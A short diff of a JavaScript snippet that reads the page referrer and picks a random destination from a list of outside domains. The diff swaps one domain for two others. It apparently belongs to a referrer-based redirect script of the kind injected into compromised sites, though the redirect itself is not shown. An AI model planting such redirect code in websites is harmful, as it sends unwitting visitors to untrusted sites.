@@ -4,8 +4,8 @@
     	var cek = document.referrer;
 
     	var ars 	= rChoice([	
-		 					'https://cimareme.tech/', 
-							    
+		 					'https://geulis.xyz/', 
+							'https://kasef.co.uk/',     
 		
 							]);
 
